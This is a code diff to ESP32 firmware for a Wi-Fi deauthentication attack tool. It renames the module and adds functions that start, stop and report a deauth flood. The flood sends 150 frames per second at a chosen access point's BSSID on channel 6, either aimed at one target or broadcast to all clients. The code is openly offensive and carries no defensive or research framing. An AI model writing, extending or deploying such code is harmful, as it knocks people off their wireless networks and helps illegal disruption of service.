@@ -1,4 +1,4 @@
-#include "wifi_deauth_amplified.h"
+#include "wifi_deauth.h"
 #include "config.h"
 #include "rtc_clock.h"
 #include "tx_arm.h"
@@ -6,7 +6,7 @@
 #include <esp_wifi.h>
 #include <LittleFS.h>
 
-namespace WiFiDeauthAmp {
+namespace WiFiDeauth {
 
 namespace {
 volatile bool g_attacking = false;
@@ -258,4 +258,38 @@ DeauthResult targeted(const DeauthConfig &config) {
     return result;
 }
 
-} // namespace WiFiDeauthAmp
+void stop() {
+    g_attacking = false;
+    Serial.println("[WiFi Deauth] Attack stopped");
+}
+
+bool isActive() {
+    return g_attacking;
+}
+
+DeauthResult sendDeauthFrames(const String &targetBSSID, uint32_t durationMs, bool broadcastClients) {
+    DeauthConfig config;
+    memset(&config, 0, sizeof(config));
+    config.mode = broadcastClients ? BROADCAST : TARGETED;
+    config.durationMs = durationMs;
+    config.packetsPerSec = 150;
+    config.targetChannel = 6;
+
+    // Parse BSSID string to bytes
+    uint8_t bssid[6] = {0};
+    if (targetBSSID.length() == 17) {  // AA:BB:CC:DD:EE:FF
+        for (int i = 0; i < 6; i++) {
+            String hex = targetBSSID.substring(i * 3, i * 3 + 2);
+            bssid[i] = (uint8_t)strtol(hex.c_str(), nullptr, 16);
+        }
+    }
+    memcpy(config.targetBssid, bssid, 6);
+
+    if (config.mode == BROADCAST) {
+        return broadcastDeauth(config);
+    } else {
+        return targeted(config);
+    }
+}
+
+}  // namespace WiFiDeauth
